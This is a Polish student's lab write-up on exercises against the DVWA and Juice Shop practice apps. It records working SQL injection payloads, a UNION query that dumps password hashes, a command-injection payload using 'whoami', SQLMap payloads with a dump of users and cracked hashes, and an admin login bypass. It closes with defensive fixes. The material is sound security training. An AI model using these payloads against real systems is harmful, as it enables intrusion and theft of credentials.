# Szablon notatek — Lab 24

## Informacje ogólne

- Data: 2026-11-26
- Imię / grupa: Remigiusz / (cs01-07-26)
- Środowisko: Linux Kali
- DVWA URL: http://127.0.0.1:8080/
- Juice Shop URL: http://127.0.0.1:3000/

## DVWA — SQL Injection

### Zachowanie bazowe

- Moduł: SQL Injection
- Poziom bezpieczeństwa: Low
- Wartość bazowa: 1
- Odpowiedź:
ID: 1
First name: admin
Surname: admin

### Test logiczny

- Payload: 1' OR '1'='1
- Odpowiedź: 
ID: 1' OR '1'='1
First name: admin
Surname: admin

ID: 1' OR '1'='1
First name: Gordon
Surname: Brown

ID: 1' OR '1'='1
First name: Hack
Surname: Me

ID: 1' OR '1'='1
First name: Pablo
Surname: Picasso

ID: 1' OR '1'='1
First name: Bob
Surname: Smith
- Co się zmieniło względem wartości bazowej: dodany zostal test logiczny "OR '1'='1"
- Wniosek: Uzycie testu logicznego ktory zwrocilo prawde, podalo nam liste uzytkownikow i dane z pol First Name i Surname - wartosc wejsciowa zmieniła logikę warunku

### UNION-based SQLi

- Payload do sprawdzenia liczby kolumn: ID: 1' UNION SELECT '1',2' --
- Obserwacja: Dwie kolumny First Name i Surname
- Payload do odczytu użytkowników: 1' UNION SELECT user, password FROM users -- 
- Obserwacja:
ID: 1' UNION SELECT user, password FROM users -- 
First name: admin
Surname: admin

ID: 1' UNION SELECT user, password FROM users -- 
First name: admin
Surname: 5f4dcc3b5aa765d61d8327deb882cf99

ID: 1' UNION SELECT user, password FROM users -- 
First name: gordonb
Surname: e99a18c428cb38d5f260853678922e03

ID: 1' UNION SELECT user, password FROM users -- 
First name: 1337
Surname: 8d3533d75ae2c3966d7e0d4fcc69216b

ID: 1' UNION SELECT user, password FROM users -- 
First name: pablo
Surname: 0d107d09f5bbe40cade3de5c71e9e9b7

ID: 1' UNION SELECT user, password FROM users -- 
First name: smithy
Surname: 5f4dcc3b5aa765d61d8327deb882cf99
- Jakie dane zostały ujawnione:
Lista uzytkownikow, a w polu surname ich hashe hasel.
Co wazne, ujawnione zostaly hashe hasel!
- Wpływ bezpieczeństwa:
Daje mozliwosc odczytu hashy hasel i porownania hashy z przygotowanym slownikiem. W dodatku konto admin i smithy maja taki sam hasl. Wniosek jest taki,
ze nie uzywaja soli i maja takie same hasla! W dodatku hasla sa przechowywane za pomoca sumy kontrolnej MD5. Ta metoda ulatwia ich odgadniecie! Zaleca sie
algorytmy Argon2 czy bcrypt uzycie soli, wysokiego kosztu obliczeniowego (liczba oteracji lub zyzycia pamieci, czas na wygenerowanie pojedynczego hasha 100 - 300 ms bez wplywau na logowanie a spowalnia atak bruteforce)

## DVWA — Command Injection

- Wartość bazowa: 127.0.0.1
- Odpowiedź bazowa:
PING 127.0.0.1 (127.0.0.1): 56 data bytes
64 bytes from 127.0.0.1: icmp_seq=0 ttl=64 time=0.046 ms
64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.048 ms
64 bytes from 127.0.0.1: icmp_seq=2 ttl=64 time=0.050 ms
64 bytes from 127.0.0.1: icmp_seq=3 ttl=64 time=0.119 ms
--- 127.0.0.1 ping statistics ---
4 packets transmitted, 4 packets received, 0% packet loss
round-trip min/avg/max/stddev = 0.046/0.066/0.119/0.031 ms
- Payload diagnostyczny: 8.8.8.8; whoami
- Odpowiedź:
PING 8.8.8.8 (8.8.8.8): 56 data bytes
64 bytes from 8.8.8.8: icmp_seq=0 ttl=62 time=12.972 ms
64 bytes from 8.8.8.8: icmp_seq=1 ttl=62 time=12.638 ms
64 bytes from 8.8.8.8: icmp_seq=2 ttl=62 time=11.540 ms
64 bytes from 8.8.8.8: icmp_seq=3 ttl=62 time=11.619 ms
--- 8.8.8.8 ping statistics ---
4 packets transmitted, 4 packets received, 0% packet loss
round-trip min/avg/max/stddev = 11.540/12.192/12.972/0.625 ms
www-data
- Jaki użytkownik systemowy został wskazany: www-data
- Dlaczego to Command Injection: Wprowadzony Payload powoduje wykonanie dodatkowego polecenia systemowego "whoami" na serwerze.
- Potencjalny wpływ:
Atakujacy moze - wykonac nieautoryzowane polecenia na serwerze
- odczytac, modyfikowac lub usuwac pliki
- pozyskiwac poufne informacje
- atakowac system, podnosic swoje uprawnienia, zaklocac dzialania uslug na serwerze

## SQLMap

- Testowany URL: http://127.0.0.1:8080/vulnerabilities/sqli/?id=1&Submit=Submit
- Czy użyto cookie sesyjnego: Tak - PHPSESSID i security=low
- Parametr podatny: id
- Typ podatności wskazany przez SQLMap:

    Type: boolean-based blind
    Title: OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment)
    Payload: id=1' OR NOT 6573=6573#&Submit=Submit

    Type: error-based
    Title: MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)
    Payload: id=1' AND EXTRACTVALUE(9774,CONCAT(0x5c,0x71786a6b71,(SELECT (ELT(9774=9774,1))),0x7162626a71))-- UOGn&Submit=Submit

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: id=1' AND (SELECT 1779 FROM (SELECT(SLEEP(5)))uIqe)-- GXDb&Submit=Submit

    Type: UNION query
    Title: MySQL UNION query (NULL) - 2 columns
    Payload: id=1' UNION ALL SELECT CONCAT(0x71786a6b71,0x707a76414352435757417a634b4747475470585157475a4e6c795358566e4f6865456a694b556277,0x7162626a71),NULL#&Submit=Submit
- Wykryte bazy:
available databases [2]:
[*] dvwa
[*] information_schema
- Wykryte tabele w `dvwa`:
[2 tables]
+-----------+
| guestbook |
| users     |
+-----------+
- Kolumny tabeli `users`:
user_id, user, password, first_name, last_name, avatar, last_login, failded_login
- Czy wykonano dump w labie: Tak, każdego z testów sqlmap.
Tak, 5 rekordów z tabeli users (5 test sqlmap):
[5 entries]
+---------+---------+-----------------------------+---------------------------------------------+-----------+------------+---------------------+--------------+
| user_id | user    | avatar                      | password                                    | last_name | first_name | last_login          | failed_login |
+---------+---------+-----------------------------+---------------------------------------------+-----------+------------+---------------------+--------------+
| 1       | admin   | /hackable/users/admin.jpg   | 5f4dcc3b5aa765d61d8327deb882cf99 (password) | admin     | admin      | 2026-11-12 12:51:44 | 0            |
| 2       | gordonb | /hackable/users/gordonb.jpg | e99a18c428cb38d5f260853678922e03 (abc123)   | Brown     | Gordon     | 2026-11-12 12:51:44 | 0            |
| 3       | 1337    | /hackable/users/1337.jpg    | 8d3533d75ae2c3966d7e0d4fcc69216b (charley)  | Me        | Hack       | 2026-11-12 12:51:44 | 0            |
| 4       | pablo   | /hackable/users/pablo.jpg   | 0d107d09f5bbe40cade3de5c71e9e9b7 (letmein)  | Picasso   | Pablo      | 2026-11-12 12:51:44 | 0            |
| 5       | smithy  | /hackable/users/smithy.jpg  | 5f4dcc3b5aa765d61d8327deb882cf99 (password) | Smith     | Bob        | 2026-11-12 12:51:44 | 0            |
+---------+---------+-----------------------------+---------------------------------------------+-----------+------------+---------------------+--------------+
- Najważniejsza obserwacja:
Potwierdzona podatność SQL Injection. Można odczytać strukture bezy i danych użytkowników. Uwaga - też haseł!.
SQLMap złamał hashe MD5 tych haseł metodą słownikową brute force.
Mamy tutaj do czynienia z poważnym zagrożeniem dla poufności danych i bezpieczeństwa tych kont.

## Juice Shop

- Testowana funkcja: SQL Incjetion
- Wartość w polu e-mail: ' OR 1=1 --
- Wartość w polu hasła: test
- Wynik: Zalogowano na konto admin@juice-sh.op - menu Account to potwierdza
- Wniosek: Potwierdzony podatnosc SQL Injection w mechanizmie logowanie Juice Shop. Mozliwe bylo uzyskanie dostpeu do konta administratora przez atakujacego
nawet bez podania prawidlowego hasla!

## Obrona

- Jaka poprawka ogranicza SQL Injection: Stosowanie zapytan parametryzowanych, ktore oddzielaja dane uzytkownika od kodu SQL.
- Jaka poprawka ogranicza Command Injection: Przekazywanie argumentow jako listy, nie wykonywanie polecen przez powloke systemowa.
- Jaką rolę pełni walidacja: Sprawdza czy dane wejsciowe sa w prawidlowym formacie i zawieraja dozwolone wartosci.
- Jaką rolę pełni allow-list: Definiuje jakie wartnosci, polecenia do zapytania sa dozwolone. Inne odrzuca.
- Jakie logi mogłyby pomóc blue teamowi: Logi serwera www, bazy danych, systemu operacyjnego.

## Mini-wniosek końcowy

Opisz w 5–7 zdaniach, czego nauczyło Cię ćwiczenie.

Rozpoznawanie SQL Incjection i Command Injection.
Zrozumienie roznicy miedzy tymi podatnosciami.
Zmiana parametru id w kodzie DVWA wplywa na wynik zapytania do bazy danych.
Uzywanie SQLMap i odczytywanie odpowiedzi po przetestowaniu podatnosci, jak istotne informacje mozna uzyskac.
Obejscie logowania w Juice Shop.
Sprawdzanie roznic miedzy Low i High poziomow zabezpieczen.
Jak wazna jest koniecznosc oddzielenia danych uzytkownika od polecen SQL i prob polecen systemowych.
